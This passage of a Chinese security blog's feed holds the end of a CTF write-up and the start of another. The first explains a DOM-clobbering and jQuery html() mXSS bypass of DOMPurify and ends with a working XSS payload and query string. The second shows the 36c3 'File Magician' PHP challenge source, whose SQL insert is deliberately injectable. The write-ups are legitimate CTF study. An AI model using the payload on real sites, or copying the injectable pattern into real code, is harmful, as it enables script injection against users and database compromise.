&#x4EE3;&#x7801;&#x57DF;&#x5F53;&#x4E2D;&#xFF0C;&#x800C;&#x662F;&#x5728;&#x901A;&#x8FC7;<code>document.write</code>&#x51FD;&#x6570;&#x4E4B;&#x540E;&#x7684;&#x4F5C;&#x7528;&#x57DF;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x5C31;&#x6D89;&#x53CA;&#x5230;&#x4E86;&#x4F5C;&#x7528;&#x57DF;&#x7684;&#x95EE;&#x9898;&#x3002;</p><h3 id="JavaScript-Scope"><a href="#JavaScript-Scope" class="headerlink" title="JavaScript Scope"></a>JavaScript Scope</h3><p>&#x6240;&#x4EE5;&#x5BF9;&#x4E8E;&#x6267;&#x884C;<code>document.write</code>&#x51FD;&#x6570;&#x8FC7;&#x540E;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5BF9;&#x4E8E;<code>onload=memeGen</code>&#x51FD;&#x6570;&#x6765;&#x8BF4;&#xFF0C;&#x5176;&#x4F5C;&#x7528;&#x57DF;&#x5E76;&#x975E;&#x662F; JS &#x7684;&#x4F5C;&#x7528;&#x57DF;&#xFF0C;&#x5728;&#x9898;&#x76EE;&#x4E2D;&#x672C;&#x6765;&#x8FD9;&#x4E48;&#x51E0;&#x4E2A;&#x4F5C;&#x7528;&#x57DF;&#xFF1A;window&#x3001;script&#x3001;onload&#xFF0C;&#x5176;&#x4E2D; window &#x5305;&#x542B;&#x4E86;&#x540E;&#x4E24;&#x4E2A;&#xFF0C;&#x540E;&#x4E24;&#x4E2A;&#x4E92;&#x4E0D;&#x5305;&#x542B;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x5728; onload &#x627E;&#x4E0D;&#x5230; notify &#x53D8;&#x91CF;&#xFF0C;&#x5C31;&#x4F1A;&#x53BB; window &#x7684;&#x4F5C;&#x7528;&#x57DF;&#x627E;&#xFF0C;&#x5C31;&#x4F1A;&#x628A; script &#x4F5C;&#x7528;&#x57DF;&#x5F53;&#x4E2D;&#x7684; notify &#x7ED9;&#x627E;&#x5230;&#xFF0C;notify &#x53D8;&#x91CF;&#x4E5F;&#x5C31;&#x6210; false &#x4E86;&#x3002;</p><p>&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#x6765;&#x7406;&#x89E3;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">name</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">const</span> test = <span class="hljs-function">(<span class="hljs-params">that,x</span>) =&gt;</span> {</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Test&apos;x: &quot;</span> + x);</span></span><br><span class="line">    if(x){</span><br><span class="line"><span class="hljs-javascript">      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;JS Magic&quot;</span>);</span></span><br><span class="line">    }</span><br><span class="line">  };</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> x = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;JS&apos;x: &quot;</span> + x);</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">  document.write(&quot;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">test(this,x)</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200202004222.png" alt></p><p>&#x539F;&#x7406;&#x90FD;&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x8FD9;&#x91CC;<code>test</code>&#x51FD;&#x6570;&#x5728;<code>onerror</code>&#x4F5C;&#x7528;&#x57DF;&#x627E;&#x5230;&#x4E86; x &#x53D8;&#x91CF;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x4E0D;&#x4F1A;&#x518D;&#x53BB;&#x627E; window &#x4F5C;&#x7528;&#x57DF;&#x4E0B;&#x7684; <code>x=false</code>&#x53D8;&#x91CF;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x672C;&#x9898;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5F15;&#x5165;&#x4E00;&#x4E2A;<code>name=notify</code>&#x7684;&#x6807;&#x7B7E;&#x6765;&#x201C;&#x8986;&#x76D6;&#x201D;&#x6389;&#x539F;&#x6765;&#x7684; notify &#x53D8;&#x91CF;&#x3002;</p><p>&#x5176;&#x5B9E;&#x8FD9;&#x4E5F;&#x662F;&#x4E00;&#x5F00;&#x59CB;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x9898;&#x76EE;&#x7ED9;&#x51FA;&#x7684;&#x4EE3;&#x7801;&#x6709;&#x4E00;&#x5904;&#x4E5F;&#x6BD4;&#x8F83;&#x795E;&#x5947;&#x5C31;&#x662F; text &amp; img</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">if</span> (text &amp;&amp; img) {</span><br><span class="line">    template = memeTemplate(img, text);</span><br><span class="line">    ...</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>memeGen</code>&#x51FD;&#x6570;&#x5728;&#x51FD;&#x6570;&#x5185;&#x627E;&#x4E0D;&#x5230;<code>text</code>&#xFF0C;onload &#x7684;&#x4F5C;&#x7528;&#x57DF;&#x4E5F;&#x627E;&#x4E0D;&#x5230;<code>text</code>&#xFF0C;&#x5C31;&#x4F1A;&#x53BB; script&#x4E0B;&#x9762;&#x627E;&#xFF0C;&#x800C;&#x591A;&#x4E2A; script &#x5C5E;&#x4E8E;&#x540C;&#x4E00;&#x4E2A;&#x4F5C;&#x7528;&#x57DF;&#xFF0C;&#x6240;&#x4EE5;&#x5BF9;&#x4E8E;&#x51FD;&#x6570;&#x5F53;&#x4E2D;&#x7684; text &#x4EE5;&#x53CA; img &#xFF0C;&#x5B83;&#x662F;&#x5728;&#x4E0B;&#x4E00;&#x5757; JS &#x4EE3;&#x7801;&#x6BB5;&#x5B9A;&#x4E49;&#x7684;&#x3002;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">let</span> notify = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">let</span> text = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&quot;text&quot;</span>);</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">let</span> img = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&quot;img&quot;</span>);</span></span><br><span class="line">  ...</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201222425.png" alt></p><h3 id="JQuery&#x2019;s-&#x2018;mXSS&#x2019;"><a href="#JQuery&#x2019;s-&#x2018;mXSS&#x2019;" class="headerlink" title="JQuery&#x2019;s &#x2018;mXSS&#x2019;"></a>JQuery&#x2019;s &#x2018;mXSS&#x2019;</h3><p>&#x6240;&#x4EE5;&#x57FA;&#x672C;&#x4E0A; notify &#x7684;&#x95EE;&#x9898;&#x6211;&#x4EEC;&#x89E3;&#x51B3;&#x4E86;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x5C31;&#x662F; DOM Purify &#x7684;&#x95EE;&#x9898;&#x4E86;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x6700;&#x7EC8;&#x6211;&#x4EEC;&#x8981;&#x63D2;&#x5165;&#x7684;&#x4EE3;&#x7801;&#x662F;&#x901A;&#x8FC7;<code>$(&quot;#notify&quot;).html(html)</code>&#x6765;&#x63D2;&#x5165;&#x7684;&#xFF0C;&#x800C;&#x53C2;&#x6570; html &#x53C8;&#x6765;&#x81EA;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html = <span class="hljs-string">`&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;&lt;b&gt;Meme&lt;/b&gt; created from <span class="hljs-subst">${DOMPurify.sanitize(text)}</span>&lt;/div&gt;`</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7B80;&#x5355;&#x8DDF;&#x4E00;&#x4E0B; JQuery &#x7684; <code>html()</code> &#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x6709;&#x4EE5;&#x4E0B;&#x5229;&#x7528;&#x94FE;&#xFF1A;</p><p><a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L372" target="_blank" rel="noopener">html()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L406" target="_blank" rel="noopener">append()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L312" target="_blank" rel="noopener">doManip()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L117" target="_blank" rel="noopener">buildFragment()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation/buildFragment.js#L39" target="_blank" rel="noopener">htmlPrefilter()</a></p><p>&#x5728; <a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L202" target="_blank" rel="noopener">htmlPrefilter()</a> &#x51FD;&#x6570;&#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x8FD9;&#x4E48;&#x4E00;&#x6BB5;&#x4EE3;&#x7801;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// source of htmlPrefilter()</span></span><br><span class="line">jQuery.extend( {</span><br><span class="line">truehtmlPrefilter: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"> html </span>) </span>{</span><br><span class="line">truetrue<span class="hljs-keyword">return</span> html.replace( rxhtmlTag, <span class="hljs-string">&quot;&lt;$1&gt;&lt;/$2&gt;&quot;</span> );</span><br><span class="line">true},</span><br><span class="line">    ...</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x5C31;&#x662F;&#x7528;&#x6765;&#x8F6C;&#x6362;&#x4E00;&#x4E9B;&#x81EA;&#x95ED;&#x5408;&#x6807;&#x7B7E;&#x7684;&#x6807;&#x7B7E;&#xFF0C;&#x4F8B;&#x5982;<code>&lt;blah/&gt;</code>&#x53D8;&#x6210;<code>&lt;blah&gt;&lt;/blah&gt;</code>&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x6765;&#x5B9E;&#x73B0;&#x4E00;&#x4E9B;&#x7ED5;&#x8FC7;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span>Elon</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7ECF;&#x8FC7;<code>innerHTML</code>&#x4F1A;&#x53D8;&#x6210;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span>Elon</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F46;&#x662F;&#x7ECF;&#x8FC7; jquery <code>html()</code> &#x5C31;&#x4F1A;&#x53D8;&#x6210;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="line">Elon</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x901A;&#x8FC7;<code>html()</code>&#x53EF;&#x4EE5;&#x628A;&#x4E00;&#x4E9B;&#x81EA;&#x95ED;&#x5408;&#x7684;&#x62C6;&#x5206;&#xFF0C;&#x4EE5;&#x53CA;&#x628A;&#x5185;&#x5BB9;&#x8F6C;&#x6362;&#x51FA;&#x53BB;&#xFF0C;&#x6709;&#x70B9;&#x7C7B;&#x4F3C;&#x4E8E; mXSS &#xFF0C;&#x6700;&#x7EC8;&#x6211;&#x4EEC;&#x5F97;&#x5230;&#x7684;&#x662F;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>Elon<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x7ED5;&#x8FC7; XSS WAF&#xFF0C;&#x4F8B;&#x5982;&#x4EE5;&#x4E0B;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-actionscript">alert()<span class="hljs-comment">//</span></span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7ECF;&#x8FC7;<code>DOMPurify.sanitize</code>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-actionscript">alert(<span class="hljs-number">1337</span>)<span class="hljs-comment">//</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7ECF;&#x8FC7; jquery <code>html()</code>&#x5230;&#x6700;&#x7EC8;&#x6E32;&#x67D3;&#x9875;&#x9762;&#x5C31;&#x53D8;&#x6210;&#x4E86;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-handlebars"><span class="hljs-xml">alert(1337)//<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x8FD9;&#x5C31;&#x662F; JQuery&#x2019;s &#x7C7B;&#x4F3C;&#x4E8E; mXSS &#x7684; trick</p><p>&#x7EFC;&#x4E0A;&#x6240;&#x8FF0;&#xFF0C;&#x914D;&#x5408;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6700;&#x7EC8; payload &#x5982;&#x4E0B;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">name</span>=<span class="hljs-string">notify</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-actionscript">alert()<span class="hljs-comment">//</span></span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6700;&#x7EC8;&#x4F20;&#x53C2;:</p><p></p><figure class="highlight xquery hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img=valid_img_url&amp;<span class="hljs-type">text</span>=&lt;img<span class="hljs-built_in"> name</span><span class="hljs-meta">%3dnotify</span>&gt;<span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style%2F</span>&gt;</span></span></span><span class="hljs-xml"><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert()%2F%2F</span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x6211;&#x4E5F;&#x4E0D;&#x662F;&#x975E;&#x5E38;&#x6E05;&#x695A;&#x4F5C;&#x8005;&#x4E3A;&#x5565;&#x8981;&#x52A0;&#x4E00;&#x4E2A; img &#x53C2;&#x6570;//&#x5168;&#x7A0B;&#x6CA1;&#x6709;&#x7528;&#x5230;</p><p>&#x6700;&#x540E;&#x518D;&#x6765;&#x4E00;&#x904D;&#xFF1A;</p><p><img src="https://i.redd.it/rz3o1yibnc511.png" alt></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="http://www.thespanner.co.uk/2013/05/16/dom-clobbering/" target="_blank" rel="noopener">DOM Clobbering</a></p><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement" target="_blank" rel="noopener">HTMLAnchorElement</a></p></body></html>]]></content>
        <author>
            <name><![CDATA[Zeddâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/01/08/36c3-web/</id>
        <title><![CDATA[36c3 Web å­¦ä¹ è®°å½•]]></title>
        <updated>2020-05-05T17:31:59+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/01/08/36c3-web/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/01/08/36c3-web/"><![CDATA[<html><head></head><body><p>&#x7B7E;&#x5230;&#x9009;&#x624B;&#x4E0D;&#x8BF7;&#x81EA;&#x6765;&#xFF0C;&#x7ECF;&#x8FC7;&#x4E86;&#x597D;&#x51E0;&#x5929;&#x7684;&#x7422;&#x78E8;&#xFF0C;&#x7EC8;&#x4E8E;&#x628A;&#x8FD9;&#x6B21;&#x6BD4;&#x8D5B;&#x7684;&#x9898;&#x76EE;&#x90FD;&#x5F04;&#x5F97;&#x5DEE;&#x4E0D;&#x591A;&#x4E86;&#xFF0C;&#x8FD9;&#x91CC;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x672C;&#x6B21;&#x6BD4;&#x8D5B; Web &#x9898;&#x76EE;&#x7684;&#x89E3;&#x6CD5;&#x3002;</p><blockquote class="colorquote success"><p>&#x6587;&#x7AE0;&#x9996;&#x53D1;&#x4E8E;&#x5148;&#x77E5;&#x793E;&#x533A;&#xFF1A;<a href="https://xz.aliyun.com/t/7081" target="_blank" rel="noopener">https://xz.aliyun.com/t/7081</a></p></blockquote><a id="more"></a><p>&#x5982;&#x679C;&#x5E08;&#x5085;&#x4EEC;&#x6709;&#x66F4;&#x597D;&#x66F4;&#x6709;&#x610F;&#x601D;&#x7684;&#x89E3;&#x6CD5;&#xFF0C;&#x6B22;&#x8FCE;&#x591A;&#x591A;&#x4E0E;&#x83DC;&#x9E21;&#x4EA4;&#x6D41;&#x3002;&#x975E;&#x5E38;&#x611F;&#x8C22; @rebirth @wonderkun @wupco &#x7B49;&#x5E08;&#x5085;&#x5728;&#x6211;&#x5B66;&#x4E60;&#x672C;&#x6B21;&#x6BD4;&#x8D5B;&#x8D5B;&#x9898;&#x65F6;&#x5019;&#x4E0D;&#x538C;&#x5176;&#x70E6;&#x5730;&#x6307;&#x5BFC;&#x6211;&#x3002;</p><h2 id="File-Magician"><a href="#File-Magician" class="headerlink" title="File Magician"></a>File Magician</h2><blockquote><p><strong>Difficulty estimate</strong>: easy</p><p><strong>Solved</strong>:133/321</p><p><strong>Points</strong>: round(1000 &#xB7; min(1, 10 / (9 + [133 solves]))) = <strong>70</strong> points</p><p><strong>Description:</strong></p><p>Finally (again), a minimalistic, open-source file hosting solution.</p><p><strong>Download:</strong></p><p><a href="https://github.com/ZeddYu/36c3-CTF-Web/blob/master/file%20magician/file%20magician-3ace41f3b0282a70.tar.xz" target="_blank" rel="noopener">file magician-3ace41f3b0282a70.tar.xz (2.1 KiB)</a></p></blockquote><p>&#x7B97;&#x662F; Web &#x5F53;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x7B7E;&#x5230;&#x9898;&#xFF0C;&#x76F4;&#x63A5;&#x7ED9;&#x51FA; Docker &#x6587;&#x4EF6;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;&#x672C;&#x5730;&#x642D;&#x8D77;&#x6765;&#x8BD5;&#x8BD5;&#x3002;</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="hljs-number">0</span>);</span><br><span class="line">ini_set(<span class="hljs-string">&apos;display_errors&apos;</span>, <span class="hljs-number">0</span>);</span><br><span class="line">ini_set(<span class="hljs-string">&apos;display_startup_errors&apos;</span>, <span class="hljs-number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>( ! <span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&apos;id&apos;</span>])) {</span><br><span class="line">    $_SESSION[<span class="hljs-string">&apos;id&apos;</span>] = bin2hex(random_bytes(<span class="hljs-number">32</span>));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$d = <span class="hljs-string">&apos;/var/www/html/files/&apos;</span>.$_SESSION[<span class="hljs-string">&apos;id&apos;</span>] . <span class="hljs-string">&apos;/&apos;</span>;</span><br><span class="line">@mkdir($d, <span class="hljs-number">0700</span>, <span class="hljs-keyword">TRUE</span>);</span><br><span class="line">chdir($d) || <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;chdir&apos;</span>);</span><br><span class="line"></span><br><span class="line">$db = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">&apos;sqlite:&apos;</span> . $d . <span class="hljs-string">&apos;db.sqlite3&apos;</span>);</span><br><span class="line">$db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line">$db-&gt;exec(<span class="hljs-string">&apos;CREATE TABLE IF NOT EXISTS upload(id INTEGER PRIMARY KEY, info TEXT);&apos;</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_FILES[<span class="hljs-string">&apos;file&apos;</span>]) &amp;&amp; $_FILES[<span class="hljs-string">&apos;file&apos;</span>][<span class="hljs-string">&apos;size&apos;</span>] &lt; <span class="hljs-number">10</span>*<span class="hljs-number">1024</span> ){</span><br><span class="line">    $s = <span class="hljs-string">&quot;INSERT INTO upload(info) VALUES (&apos;&quot;</span> .(<span class="hljs-keyword">new</span> finfo)-&gt;file($_FILES[<span class="hljs-string">&apos;file&apos;</span>][<span class="hljs-string">&apos;tmp_name&apos;</span>]). <span class="hljs-string">&quot; &apos;);&quot;</span>;</span><br><span class="line">    $db-&gt;exec($s);</span><br><span class="line">    move_uploaded_file( $_FILES[<span class="hljs-string">&apos;file&apos;</span>][<span class="hljs-string">&apos;tmp_name&apos;</span>], $d . $db-&gt;lastInsertId()) || <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;move_upload_file&apos;</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$uploads = [];</span><br><span class="line">$sql = <span class="hljs-string">&apos;SELECT * FROM upload&apos;</span>;</span><br><span class="line"><span class="hljs-keyword">foreach</span> ($db-&gt;query($sql) <span class="hljs-keyword">as</span> $row) {</span><br><span class="line">    $uploads[] = [$row[<span class="hljs-string">&apos;id&apos;</span>], $row[<span class="hljs-string">&apos;info&apos;</span>]];</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;file magician&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;form enctype=<span 